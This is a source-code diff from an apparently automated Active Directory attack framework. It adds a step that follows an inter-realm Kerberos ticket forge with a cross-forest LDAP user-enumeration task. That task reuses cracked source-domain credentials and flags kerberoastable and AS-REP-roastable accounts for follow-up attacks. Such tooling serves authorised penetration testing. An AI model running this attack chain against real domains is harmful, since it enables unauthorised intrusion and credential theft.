@@ -89,8 +89,8 @@ fn is_filtered_inter_forest_trust(state: &StateInner, source: &str, target: &str
     // foreign-side domain name in each enumeration result, so the entry for
     // `target_l` describes the source→target relationship. Falling back to
     // the source key returns *some other* trust the source happens to have
-    // (e.g. north→sevenkingdoms parent_child stored under "sevenkingdoms.local"
-    // when we query sevenkingdoms→essos), which would wrongly classify the
+    // (e.g. child→contoso parent_child stored under "contoso.local"
+    // when we query contoso→fabrikam), which would wrongly classify the
     // unknown cross-forest path as intra-forest and let the doomed forge fire.
     if let Some(t) = state.trusted_domains.get(&target_l) {
         if t.is_cross_forest() {
@@ -130,7 +130,7 @@ async fn wake_cross_forest_fallbacks(dispatcher: &Dispatcher, target_domain: &st
     // keyed on the CA host (IP or hostname) — not the target domain. So for
     // each known host that belongs to `target_domain`, add a `{host}:` prefix.
     // This lets a freshly-acquired cross-forest credential re-attempt
-    // certipy_find against an essos CA that was previously locked by a wrong
+    // certipy_find against a fabrikam CA that was previously locked by a wrong
     // initial cred.
     {
         let s = dispatcher.state.read().await;
@@ -900,7 +900,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                     // child DC's trustedDomain LDAP objects and resolves DC IPs
                     // via DNS — script-level flags for IP/domain are unsupported
                     // (argparse exit 2). However, on workers without forest DNS,
-                    // the bare domain FQDN (`north.sevenkingdoms.local`) won't
+                    // the bare domain FQDN (`child.contoso.local`) won't
                     // resolve — so pass the IPs so the tool wrapper can
                     // pre-seed `/etc/hosts` before invoking impacket.
                     let mut raise_args = json!({
@@ -1982,7 +1982,7 @@ pub async fn auto_trust_follow(dispatcher: Arc<Dispatcher>, mut shutdown: watch:
                             // this, wake_cross_forest_fallbacks below is a
                             // no-op when no same-realm credential bound the
                             // ACL/foreign-group/cross-forest enums to the
-                            // target — the case that left essos.local
+                            // target — the case that left fabrikam.local
                             // permanently un-attackable in op-20260502-013857.
                             {
                                 let dispatcher_fb = dispatcher_bg.clone();
@@ -2030,6 +2030,140 @@ struct TrustFollowWork {
     target_dc_ip: Option<String>,
     source_domain_sid: Option<String>,
     target_domain_sid: Option<String>,
+}
+
+/// Submit a cross-forest user-enumeration recon task immediately after a
+/// successful inter-realm ticket forge.
+///
+/// Without this, `auto_cross_forest_enum` would refuse to dispatch (its
+/// `best_cred` returns None when the target forest has no credentials in
+/// state) and the freshly-forged ticket would sit idle. This helper queues
+/// the same `ldap_user_enumeration` recon payload using any usable
+/// source-domain credential as a placeholder; the credential resolver
+/// detects the cross-forest LDAP tool, finds no NTLM hash for the target,
+/// and injects the inter-realm ccache via `resolve_cross_forest_ticket`.
+async fn dispatch_post_ticket_user_enumeration(
+    dispatcher: &Dispatcher,
+    source_domain: &str,
+    target_domain: &str,
+) {
+    let target_lower = target_domain.to_lowercase();
+
+    let (target_dc_ip, target_dc_fqdn, source_cred) = {
+        let s = dispatcher.state.read().await;
+        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
+            warn!(
+                source_domain,
+                target_domain, "post-ticket user-enum skipped: no DC IP for target domain"
+            );
+            return;
+        };
+        let dc_fqdn = s
+            .hosts
+            .iter()
+            .find(|h| h.ip == dc_ip && !h.hostname.is_empty())
+            .map(|h| {
+                let hn = h.hostname.to_lowercase();
+                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
+                    hn
+                } else {
+                    format!("{hn}.{target_lower}")
+                }
+            });
+        // Pick any non-empty-password credential from the source forest. The
+        // resolver will swap the cred for the ticket; what matters is that
+        // bind_domain ends up != target_domain so the cross-forest path is
+        // taken. We accept child-domain creds (e.g. child.contoso.local
+        // when source is contoso.local) because intermediate ops often
+        // only own the child realm — the trust key extraction still uses the
+        // parent's outbound trust, but state.credentials only holds the
+        // identities we cracked along the way.
+        let cred = s
+            .credentials
+            .iter()
+            .find(|c| {
+                !c.password.is_empty()
+                    && is_domain_related(&c.domain, source_domain)
+                    && !s.is_credential_quarantined(&c.username, &c.domain)
+            })
+            .cloned();
+        (dc_ip, dc_fqdn, cred)
+    };
+
+    let Some(cred) = source_cred else {
+        warn!(
+            source_domain,
+            target_domain,
+            "post-ticket user-enum skipped: no source-domain credential to seed the task"
+        );
+        return;
+    };
+
+    let target = target_dc_fqdn.unwrap_or_else(|| target_dc_ip.clone());
+
+    let payload = json!({
+        "technique": "ldap_user_enumeration",
+        "target_ip": target,
+        "domain": target_domain,
+        "bind_domain": source_domain,
+        "credential": {
+            "username": cred.username,
+            "password": cred.password,
+            "domain": cred.domain,
+        },
+        "filters": ["(objectCategory=person)(objectClass=user)"],
+        "attributes": [
+            "sAMAccountName", "description", "memberOf",
+            "userAccountControl", "servicePrincipalName",
+            "msDS-AllowedToDelegateTo", "adminCount"
+        ],
+        "cross_forest": true,
+        "instructions": concat!(
+            "Cross-forest user enumeration after inter-realm Kerberos ticket forge. ",
+            "An inter-realm ccache for this target domain has been pre-cached and ",
+            "will be auto-injected by the credential resolver. Use ",
+            "`ldap_search_descriptions` (or `ldap_search`) against the target DC ",
+            "FQDN — these tools perform GSSAPI bind with the injected ticket. Do ",
+            "NOT use the supplied password credential for the bind (it is from a ",
+            "different forest and will be rejected); the ticket handles auth.\n\n",
+            "Report every user found with EXACTLY this JSON format in ",
+            "discovered_users:\n",
+            "  {\"username\": \"samaccountname\", \"domain\": \"target.domain\", ",
+            "\"source\": \"ldap_enumeration\", \"memberOf\": [\"Group1\"]}\n",
+            "Flag DoesNotRequirePreAuth as vuln_type='asrep_roastable' and SPNs as ",
+            "vuln_type='kerberoastable'."
+        ),
+    });
+
+    let priority = dispatcher.effective_priority("cross_forest_enum");
+    match dispatcher
+        .throttled_submit("recon", "recon", payload, priority)
+        .await
+    {
+        Ok(Some(task_id)) => {
+            info!(
+                task_id = %task_id,
+                source_domain,
+                target_domain,
+                target_dc = %target,
+                "Post-ticket cross-forest user enumeration dispatched"
+            );
+        }
+        Ok(None) => {
+            debug!(
+                source_domain,
+                target_domain, "Post-ticket user-enum deferred by throttling"
+            );
+        }
+        Err(e) => {
+            warn!(
+                err = %e,
+                source_domain,
+                target_domain,
+                "Failed to submit post-ticket user-enum task"
+            );
+        }
+    }
 }
 
 /// Forge an inter-realm Kerberos ticket for a SID-filtered cross-forest trust.
@@ -2182,6 +2316,15 @@ async fn dispatch_create_inter_realm_ticket(
                 .state
                 .publish_kerberos_ticket(&dispatcher.queue, ticket)
                 .await;
+
+            // Without a follow-up dispatch the ticket sits idle: the foreign
+            // forest has no credentials in state, so `auto_cross_forest_enum`
+            // skips it (best_cred returns None), and no LDAP-bind tool ever
+            // runs against the target DC. Kick off a cross-forest user-enum
+            // task here so the credential resolver injects the freshly-forged
+            // ticket and `ldap_search`/`ldap_search_descriptions` actually
+            // populates `state.users` for the target domain.
+            dispatch_post_ticket_user_enumeration(dispatcher, source_domain, target_domain).await;
         }
         Err(e) => {
             tracing::warn!(
@@ -2406,10 +2549,10 @@ mod tests {
 
     #[test]
     fn filtered_inter_forest_ignores_unrelated_source_metadata() {
-        // Repro of op-20260429-111016 bug: north discovered its parent trust
-        // and stored TrustInfo{ domain="sevenkingdoms.local", parent_child,
+        // Repro of op-20260429-111016 bug: child discovered its parent trust
+        // and stored TrustInfo{ domain="contoso.local", parent_child,
         // sid_filtering=false }. Querying the unrelated cross-forest path
-        // sevenkingdoms.local → essos.local must NOT be answered with that
+        // contoso.local → fabrikam.local must NOT be answered with that
         // parent_child entry (which would wrongly classify the cross-forest
         // path as intra-forest). With no metadata for the actual target we
         // now try the forge rather than silently suppressing it.
